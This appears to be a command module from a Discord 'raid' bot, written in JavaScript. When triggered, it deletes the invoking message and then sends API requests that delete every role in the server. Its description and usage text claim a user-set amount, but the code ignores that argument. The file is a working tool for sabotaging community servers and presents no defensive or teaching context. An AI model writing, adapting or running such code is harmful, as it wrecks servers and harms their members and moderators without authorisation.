const axios = require("axios");
const config = require('../../config.json');
const uagent = config.uagent;
const token = config.token;
const headers = {'User-Agent': uagent, 'Authorization': token }

async function roleD(guild,role){
  axios
  .delete(`https://discord.com/api/v8/guilds/${guild}/roles/${role}`,{
    headers
})

  .then(res => {
    console.log("Role Deleted");
  })
  .catch(error => {
    console.error("Error");
  });
}

module.exports = {
  name: "rd",
  category: "RAID",
  description: "Delete No of user defined role",
  usage: "<Your Prefix>rd <amt>",
  run: async (dortrox, message) => {
    message.delete();
    message.guild.roles.cache.forEach(role => {
        roleD(message.guild.id, role.id)
    });
  },
};
